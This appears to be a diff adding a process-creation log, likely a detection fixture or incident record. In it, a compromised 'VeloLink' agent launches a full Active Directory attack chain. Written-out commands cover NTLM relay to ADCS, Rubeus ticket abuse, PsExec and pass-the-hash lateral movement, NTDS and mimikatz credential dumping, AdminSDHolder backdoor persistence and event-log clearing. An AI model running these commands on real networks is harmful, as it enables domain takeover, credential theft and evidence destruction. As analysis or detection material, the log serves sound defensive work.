@@ -1,0 +1,22 @@
+PID,ParentPID,Image,CommandLine,StartTime,User
+4,0,System,,2026-04-21 02:00:00,SYSTEM
+540,4,C:\Windows\System32\smss.exe,,2026-04-21 02:00:01,SYSTEM
+820,540,C:\Windows\System32\services.exe,,2026-04-21 02:00:05,SYSTEM
+4012,820,C:\Program Files\VeloLink\VeloLink-Agent.exe,"""C:\Program Files\VeloLink\VeloLink-Agent.exe"" --service",2026-04-21 02:14:08,NT AUTHORITY\SYSTEM
+4088,4012,C:\Windows\System32\rundll32.exe,"rundll32.exe ""C:\Program Files\VeloLink\modules\VeloLink.SecureCore.dll"",ExecutePolicy",2026-04-21 02:14:53,NT AUTHORITY\SYSTEM
+4112,4088,C:\Windows\System32\svchost.exe,"C:\Windows\System32\svchost.exe -k netsvcs -p -s VeloLinkUpdater",2026-04-21 02:15:30,NT AUTHORITY\SYSTEM
+4188,4112,C:\Windows\System32\PetitPotam.exe,"PetitPotam.exe -d ENT.EXAMPLE.LOCAL -u ANONYMOUS 10.50.10.40 10.50.10.10",2026-04-21 02:42:01,NT AUTHORITY\SYSTEM
+4192,4112,C:\Windows\System32\ntlmrelayx.exe,"ntlmrelayx.py -t http://CA01.ent.example.local/certsrv/certfnsh.asp --adcs --template DomainController",2026-04-21 02:42:01,NT AUTHORITY\SYSTEM
+4256,4112,C:\Windows\System32\Rubeus.exe,"Rubeus.exe asktgt /user:DC01$ /certificate:C:\ProgramData\velolink\cache\dc01.pfx /domain:ent.example.local /nowrap",2026-04-21 02:42:32,NT AUTHORITY\SYSTEM
+4318,4112,C:\Windows\System32\Rubeus.exe,"Rubeus.exe s4u /impersonateuser:domadmin /msdsspn:cifs/DC01.ent.example.local /ticket:doIFRD... /ptt",2026-04-21 03:05:14,NT AUTHORITY\SYSTEM
+4420,4112,C:\PsExec.exe,"PsExec.exe \\DC01 -u domadmin -p ******* -accepteula cmd.exe",2026-04-21 03:05:48,ENT\domadmin
+4488,4112,C:\PsExec.exe,"PsExec.exe \\FS-DATA-02 -u domadmin -p ******* cmd.exe",2026-04-21 03:06:21,ENT\domadmin
+4552,4112,C:\Python27\python.exe,"python.exe wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c ent.example.local/domadmin@WS-FIN-09",2026-04-21 03:07:15,ENT\domadmin
+4622,4420,C:\Windows\System32\ntdsutil.exe,"ntdsutil.exe ""ac in ntds"" ""ifm"" ""create full c:\temp\ntds"" q q",2026-04-21 03:08:42,ENT\domadmin
+4688,4420,C:\Windows\System32\mimikatz.exe,"mimikatz.exe ""lsadump::dcsync /user:ent.example.local\krbtgt /domain:ent.example.local"" ""exit""",2026-04-21 03:09:05,ENT\domadmin
+4710,4420,C:\Windows\System32\mimikatz.exe,"mimikatz.exe ""sekurlsa::logonpasswords"" ""exit""",2026-04-21 03:09:30,ENT\domadmin
+4780,4420,C:\Windows\System32\dsacls.exe,"dsacls.exe CN=AdminSDHolder,CN=System,DC=ent,DC=example,DC=local /G ""ENT\svc-velolink:GA""",2026-04-21 03:11:14,ENT\domadmin
+4830,4420,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /sc daily /tn MicrosoftEdgeUpdateCore /tr ""rundll32.exe C:\ProgramData\velolink\update.dll,Refresh"" /ru SYSTEM /f",2026-04-22 09:12:08,NT AUTHORITY\SYSTEM
+4912,4420,C:\Windows\System32\wevtutil.exe,"wevtutil.exe cl Security",2026-04-22 09:15:00,NT AUTHORITY\SYSTEM
+4914,4420,C:\Windows\System32\wevtutil.exe,"wevtutil.exe cl System",2026-04-22 09:15:01,NT AUTHORITY\SYSTEM
+4916,4420,C:\Windows\System32\wevtutil.exe,"wevtutil.exe cl Application",2026-04-22 09:15:02,NT AUTHORITY\SYSTEM
